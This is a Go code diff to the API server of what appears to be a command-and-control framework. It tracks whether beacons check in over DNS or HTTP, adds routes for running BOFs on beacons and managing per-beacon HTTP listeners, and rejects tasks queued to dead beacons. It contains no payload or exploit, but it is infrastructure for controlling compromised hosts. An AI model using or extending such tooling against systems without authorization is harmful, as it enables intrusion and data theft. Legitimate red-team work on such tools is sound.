@@ -290,7 +290,12 @@ type DNSServerCheckinRequest struct {
 type BeaconReportRequest struct {
 	DNSServerID string `json:"dns_server_id"`
 	APIKey      string `json:"api_key"`
-	Beacon      struct {
+	// Transport is how the beacon reached the listener: empty or "dns" when the
+	// listener does not say, "http"/"dual" when it came in over HTTP. ListenerName
+	// is the malleable profile that served it.
+	Transport    string `json:"transport,omitempty"`
+	ListenerName string `json:"listener_name,omitempty"`
+	Beacon       struct {
 		ID                string    `json:"id"`
 		Hostname          string    `json:"hostname"`
 		Username          string    `json:"username"`
@@ -1340,14 +1345,49 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 	// Get the DNS domain for this server (cached to avoid N+1 DB queries)
 	dnsDomain := api.getDNSServerDomain(dnsServerID)
 
-	// Track beacon DNS contact (async, don't fail the response if this errors)
-	go func(beaconID, serverID, domain string) {
-		if err := api.db.RecordBeaconDNSContact(beaconID, serverID, domain); err != nil {
-			if api.config.Debug {
-				fmt.Printf("[API] Warning: Failed to record beacon DNS contact: %v\n", err)
-			}
+	// Record the contact against the transport it actually arrived on. A beacon
+	// that reached this listener over HTTP is not a DNS contact, and a dual beacon
+	// is both: writing one row either way is what made the dashboard show a
+	// transport the beacon was not using.
+	transport := strings.ToLower(strings.TrimSpace(req.Transport))
+	if transport == "" {
+		// Older listeners do not send the transport. Fall back to what the
+		// dashboard recorded for this beacon (a transport push or a build), so an
+		// HTTP beacon's contact is not filed as a DNS one.
+		transport = api.db.GetBeaconTransport(req.Beacon.ID)
+		if transport == "" {
+			transport = "dns"
 		}
-	}(req.Beacon.ID, dnsServerID, dnsDomain)
+	}
+
+	// Track beacon DNS contact (async, don't fail the response if this errors)
+	if transport != "http" {
+		go func(beaconID, serverID, domain string) {
+			if err := api.db.RecordBeaconDNSContact(beaconID, serverID, domain); err != nil {
+				if api.config.Debug {
+					fmt.Printf("[API] Warning: Failed to record beacon DNS contact: %v\n", err)
+				}
+			}
+		}(req.Beacon.ID, dnsServerID, dnsDomain)
+	}
+
+	// A report from the transport an operator asked for is the confirmation that
+	// the change landed; until then the dashboard shows it as pending.
+	go func(beaconID, reported string) {
+		if err := api.db.ConfirmBeaconTransport(beaconID, reported); err != nil && api.config.Debug {
+			fmt.Printf("[API] Warning: failed to confirm transport for %s: %v\n", beaconID, err)
+		}
+	}(req.Beacon.ID, transport)
+
+	if transport == "http" || transport == "dual" {
+		go func(beaconID, serverID, listener string) {
+			if err := api.db.RecordBeaconHTTPContact(beaconID, serverID, listener); err != nil {
+				if api.config.Debug {
+					fmt.Printf("[API] Warning: Failed to record beacon HTTP contact: %v\n", err)
+				}
+			}
+		}(req.Beacon.ID, dnsServerID, req.ListenerName)
+	}
 
 	if api.config.Debug {
 		fmt.Printf("[API] Beacon %s stored successfully from DNS server %s\n",
@@ -1597,6 +1637,17 @@ func (api *APIServer) handleGetBeaconBuildConfig(w http.ResponseWriter, r *http.
 	api.sendJSON(w, buildConfig)
 }
 
+// handleGetBeaconHTTPContacts returns the HTTP listeners a beacon has contacted.
+func (api *APIServer) handleGetBeaconHTTPContacts(w http.ResponseWriter, r *http.Request) {
+	beaconID := mux.Vars(r)["id"]
+	contacts, err := api.db.GetBeaconHTTPContacts(beaconID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve HTTP contacts")
+		return
+	}
+	api.sendJSON(w, contacts)
+}
+
 // handleGetBeaconDNSContacts returns DNS contact history for a beacon
 func (api *APIServer) handleGetBeaconDNSContacts(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
@@ -1757,6 +1808,12 @@ func (api *APIServer) handleCreateTask(w http.ResponseWriter, r *http.Request) {
 	if chunkCount > MaxTaskChunks {
 		api.sendError(w, http.StatusBadRequest,
 			fmt.Sprintf("command requires %d chunks (max %d)", chunkCount, MaxTaskChunks))
+		return
+	}
+
+	// A dead beacon's record stays behind; queueing to it succeeds and then sits
+	// pending forever, which reads like a slow beacon rather than a missing one.
+	if !api.requireLiveBeacon(w, req.BeaconID, "a task") {
 		return
 	}
 
@@ -3508,7 +3565,11 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	// Kept as an alias: this route previously served a page file that did not exist.
 	router.HandleFunc("/dns-servers", api.handleListenersPage).Methods("GET")
 	router.HandleFunc("/builder", api.handleBuilderPage).Methods("GET")
-	router.HandleFunc("/profiles", api.handleProfilesPage).Methods("GET")
+	// HTTP profiles live on the listeners page: a profile only exists to be served
+	// by a listener, so they belong in one view. Kept as a redirect for bookmarks.
+	router.HandleFunc("/profiles", func(w http.ResponseWriter, r *http.Request) {
+		http.Redirect(w, r, "/listeners#profiles", http.StatusFound)
+	}).Methods("GET")
 	router.HandleFunc("/stager", api.handleStagerPage).Methods("GET")
 	router.HandleFunc("/exfils", api.handleExfilsPage).Methods("GET")
 	router.HandleFunc("/users", api.handleUsersPage).Methods("GET")
@@ -3555,9 +3616,14 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	operatorRouter.HandleFunc("/beacons/{id}", api.handleGetBeacon).Methods("GET")
 	operatorRouter.HandleFunc("/beacons/{id}/build-config", api.handleGetBeaconBuildConfig).Methods("GET")
 	operatorRouter.HandleFunc("/beacons/{id}/dns-contacts", api.handleGetBeaconDNSContacts).Methods("GET")
+	operatorRouter.HandleFunc("/beacons/{id}/http-contacts", api.handleGetBeaconHTTPContacts).Methods("GET")
 	operatorRouter.HandleFunc("/beacons/{id}/domains", api.handleGetBeaconDomains).Methods("GET")
 	operatorRouter.Handle("/beacons/{id}/domains", operatorWrite(http.HandlerFunc(api.handleUpdateBeaconDomain))).Methods("PUT")
 	operatorRouter.Handle("/beacons/{id}/domains", operatorWrite(http.HandlerFunc(api.handleAddBeaconDomain))).Methods("POST")
+	// BOF execution and per-beacon HTTP listener management (beacon dashboard).
+	operatorRouter.Handle("/beacons/{id}/bof", operatorWrite(http.HandlerFunc(api.handleRunBOF))).Methods("POST")
+	operatorRouter.HandleFunc("/beacons/{id}/http-listeners", api.handleListBeaconHTTPListeners).Methods("GET")
+	operatorRouter.Handle("/beacons/{id}/http-listeners", operatorWrite(http.HandlerFunc(api.handleSetBeaconHTTPListeners))).Methods("POST")
 	operatorRouter.Handle("/beacons/{id}", operatorWrite(http.HandlerFunc(api.handleDeleteBeacon))).Methods("DELETE")
 	operatorRouter.Handle("/beacons/{id}/task", operatorWrite(http.HandlerFunc(api.handleCreateTask))).Methods("POST")
 	operatorRouter.HandleFunc("/tasks", api.handleListTasks).Methods("GET")
@@ -3628,6 +3694,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/http-profiles", api.handleFetchAssignedHTTPProfiles).Methods("GET")
 	dnsRouter.HandleFunc("/checkin", api.handleDNSServerCheckin).Methods("POST")
 	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
+	dnsRouter.HandleFunc("/bootstrap", api.handleBootstrapProfile).Methods("GET")
 	dnsRouter.HandleFunc("/beacon-status", api.handleBeaconStatusUpdate).Methods("POST")
 	dnsRouter.HandleFunc("/logs", api.handleDNSServerLogs).Methods("POST")
 	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
@@ -3691,10 +3758,6 @@ func (api *APIServer) handleListenersPage(w http.ResponseWriter, r *http.Request
 // handleListenerPage serves one listener's management view.
 func (api *APIServer) handleListenerPage(w http.ResponseWriter, r *http.Request) {
 	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "listener.html"))
-}
-
-func (api *APIServer) handleProfilesPage(w http.ResponseWriter, r *http.Request) {
-	serveNoCache(w, r, filepath.Join(api.config.WebRoot, "profiles.html"))
 }
 
 func (api *APIServer) handleUsersPage(w http.ResponseWriter, r *http.Request) {
